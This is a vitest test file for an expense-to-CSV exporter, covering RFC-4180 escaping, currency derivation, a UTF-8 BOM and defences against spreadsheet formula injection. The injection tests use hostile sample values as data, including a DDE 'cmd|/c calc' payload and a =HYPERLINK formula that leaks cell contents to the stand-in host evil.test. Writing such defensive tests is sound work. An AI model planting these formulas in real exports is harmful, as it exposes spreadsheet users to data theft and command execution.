import { describe, it, expect } from 'vitest';
import { expensesToCsv, expensesToCsvBlob } from '@/lib/expense-csv';
import type { Expense } from '@/core/budget/expenses';

/**
 * S158 — `expensesToCsv` (pure, framework-free CSV serializer). RFC-4180 byte-checked:
 * header + rows, CRLF row separators, quoting/escaping for comma/quote/newline, currency
 * derived from leg, split/paidBy flattening, and the empty-list header-only case.
 */

function exp(over: Partial<Expense> = {}): Expense {
  return {
    id: 'e1',
    leg: 'nepal',
    category: 'food',
    amount: 1000,
    createdAt: '2026-12-10T09:00:00.000Z',
    ...over,
  };
}

const HEADER = 'Date,Leg,Category,Currency,Amount,Note,Paid By,Split With';

/** Minimal RFC-4180 single-row field parser (TEST-ONLY — not shipped) for a genuine round-trip
 *  check: handles quoted fields containing commas/newlines and doubled interior quotes. */
function parseCsvRow(row: string): string[] {
  const fields: string[] = [];
  let field = '';
  let inQuotes = false;
  for (let i = 0; i < row.length; i++) {
    const c = row[i];
    if (inQuotes) {
      if (c === '"' && row[i + 1] === '"') {
        field += '"';
        i++;
      } else if (c === '"') {
        inQuotes = false;
      } else {
        field += c;
      }
    } else if (c === '"') {
      inQuotes = true;
    } else if (c === ',') {
      fields.push(field);
      field = '';
    } else {
      field += c;
    }
  }
  fields.push(field);
  return fields;
}

describe('expensesToCsv', () => {
  it('empty list → header row only (CRLF-terminated)', () => {
    expect(expensesToCsv([])).toBe(`${HEADER}\r\n`);
  });

  it('one plain expense → header + one CRLF-separated data row', () => {
    const csv = expensesToCsv([exp({ date: '2026-12-10', category: 'food', amount: 1500 })]);
    expect(csv).toBe(`${HEADER}\r\n2026-12-10,nepal,food,NPR,1500,,,\r\n`);
  });

  it('derives currency from leg (nepal→NPR, japan→JPY) with no conversion', () => {
    const csv = expensesToCsv([
      exp({ id: 'e1', leg: 'nepal', amount: 100 }),
      exp({ id: 'e2', leg: 'japan', amount: 200 }),
    ]);
    const rows = csv.trimEnd().split('\r\n');
    expect(rows[1]).toContain(',NPR,100,');
    expect(rows[2]).toContain(',JPY,200,');
  });

  it('flattens paidBy/split (S144) — semicolon-joined members; both absent on the fast path', () => {
    const csv = expensesToCsv([
      exp({ note: 'Dinner', paidBy: 'Powan', split: ['Powan', 'Alex', 'Sam'] }),
    ]);
    expect(csv).toBe(`${HEADER}\r\n,nepal,food,NPR,1000,Dinner,Powan,Powan; Alex; Sam\r\n`);
  });

  it('escapes a note containing a comma, a double quote, AND a newline (round-trips)', () => {
    const note = 'Taxi, "airport" run\nvia the ring road';
    const csv = expensesToCsv([exp({ note })]);
    const expectedField = '"Taxi, ""airport"" run\nvia the ring road"';
    expect(csv).toBe(`${HEADER}\r\n,nepal,food,NPR,1000,${expectedField},,\r\n`);

    // Genuine round-trip: decode the row with a minimal RFC-4180 field parser (respects quoted
    // commas/newlines/doubled-quotes) and confirm the Note field decodes back to the ORIGINAL
    // string byte-for-byte — proves the escaping is not merely present but correct.
    const dataRow = csv.slice(HEADER.length + 2, -2); // strip header+CRLF and the trailing CRLF
    const fields = parseCsvRow(dataRow);
    expect(fields).toEqual(['', 'nepal', 'food', 'NPR', '1000', note, '', '']);
  });

  it('a comma-only note is quoted with no doubled quotes', () => {
    const csv = expensesToCsv([exp({ note: 'Lunch, dinner' })]);
    expect(csv).toContain('"Lunch, dinner"');
  });

  it('a plain note with no special characters is NOT quoted', () => {
    const csv = expensesToCsv([exp({ note: 'Taxi fare' })]);
    expect(csv).toContain(',Taxi fare,');
    expect(csv).not.toContain('"Taxi fare"');
  });
});

/** #115 — formula/DDE injection. A note is traveller-written and the exporter opens it in Excel. */
describe('expensesToCsv — formula injection', () => {
  /** The Note field of the single data row, decoded back through the RFC-4180 parser. */
  function noteField(note: string): string {
    const csv = expensesToCsv([exp({ note })]);
    return parseCsvRow(csv.slice(HEADER.length + 2, -2))[5];
  }

  it.each([
    ['=', "=cmd|'/c calc'!A1"],
    ['+', '+1+1'],
    ['-', '-1+cmd|X'],
    ['@', '@SUM(A1:A9)'],
    ['TAB', '\t=1+1'],
    ['CR', '\r=1+1'],
    ['LF', '\n=1+1'], // stripped as leading whitespace exactly like TAB/CR, so it is a trigger too
  ])('neutralizes a note starting with %s', (_label, note) => {
    expect(noteField(note)).toBe(`'${note}`);
  });

  it('=HYPERLINK exfiltration payload is inert (apostrophe inside the quotes)', () => {
    const note = '=HYPERLINK("http://evil.test?d="&A1,"Click")';
    const csv = expensesToCsv([exp({ note })]);
    // Quoted (it contains commas + quotes) with the apostrophe FIRST inside the quotes, and the
    // interior double quotes doubled — pinning the compose order, not just the presence of a `'`.
    expect(csv).toContain(
      `,"'=HYPERLINK(""http://evil.test?d=""&A1,""Click"")",`,
    );
    expect(csv).not.toContain(',\'"=HYPERLINK');
    expect(noteField(note)).toBe(`'${note}`);
  });

  it('composes with RFC-4180 quoting: `=1,2` → `"\'=1,2"` and round-trips', () => {
    const csv = expensesToCsv([exp({ note: '=1,2' })]);
    expect(csv).toBe(`${HEADER}\r\n,nepal,food,NPR,1000,"'=1,2",,\r\n`);
    expect(noteField('=1,2')).toBe("'=1,2");
  });

  it('composes with a trigger AND a quote AND a newline in one value', () => {
    const note = '=A1&"x"\nsecond line';
    expect(noteField(note)).toBe(`'${note}`);
    expect(expensesToCsv([exp({ note })])).toContain(`,"'=A1&""x""\nsecond line",`);
  });

  it('a negative amount stays a bare number — the Amount column must still sum', () => {
    const csv = expensesToCsv([exp({ date: '2026-12-10', amount: -42 })]);
    expect(csv).toBe(`${HEADER}\r\n2026-12-10,nepal,food,NPR,-42,,,\r\n`);
  });

  it.each(['-42', '+42', '-4.25', '-1e5', '-1E+5'])(
    'a note that is entirely the number literal %s is left alone',
    (note) => {
      expect(noteField(note)).toBe(note);
    },
  );

  it.each(['-42+cmd|X', '-4.2.3', '- 42', '-42=1', '+42;=1'])(
    'a near-number with a payload after it (%s) is still neutralized',
    (note) => {
      expect(noteField(note)).toBe(`'${note}`);
    },
  );

  it('an ordinary note is byte-identical to the pre-fix output (no stray apostrophe)', () => {
    const csv = expensesToCsv([
      exp({ date: '2026-12-10', amount: 1500, note: 'Taxi fare', paidBy: 'Powan' }),
    ]);
    expect(csv).toBe(`${HEADER}\r\n2026-12-10,nepal,food,NPR,1500,Taxi fare,Powan,\r\n`);
    expect(csv).not.toContain("'");
  });

  it('a trigger char that is not leading is left alone', () => {
    expect(noteField('Bus 2+2 fare')).toBe('Bus 2+2 fare');
    expect(noteField('a@b')).toBe('a@b');
  });
});

// The download path, not the serializer. Excel on Windows ignores the Blob's charset when a .csv
// is opened from disk and decodes with the system codepage, so a Japanese note or an accented
// traveller name arrives as mojibake unless the bytes start with a BOM. The BOM belongs to the
// download only — `expensesToCsv` stays clean text for every other consumer.
describe('expensesToCsvBlob — UTF-8 BOM on the downloaded file', () => {
  const rows = [exp({ date: '2026-12-10', note: '一蘭のラーメン', paidBy: 'Ana' })];

  it('the Blob is BOM-prefixed and is otherwise byte-identical to the serializer output', async () => {
    // Asserted on the BYTES: `Blob.text()` runs a UTF-8 decode, which strips a leading BOM by
    // spec, so it cannot see the thing Excel is reading.
    const bytes = new Uint8Array(await expensesToCsvBlob(rows).arrayBuffer());
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    const body = new TextDecoder('utf-8').decode(bytes.slice(3));
    expect(body).toBe(expensesToCsv(rows));
    expect(body).toContain('一蘭のラーメン');
  });

  it('the pure serializer does NOT carry the BOM', () => {
    expect(expensesToCsv(rows).charCodeAt(0)).not.toBe(0xfeff);
  });

  it('is served as UTF-8 text/csv', () => {
    expect(expensesToCsvBlob(rows).type).toBe('text/csv;charset=utf-8;');
  });
});
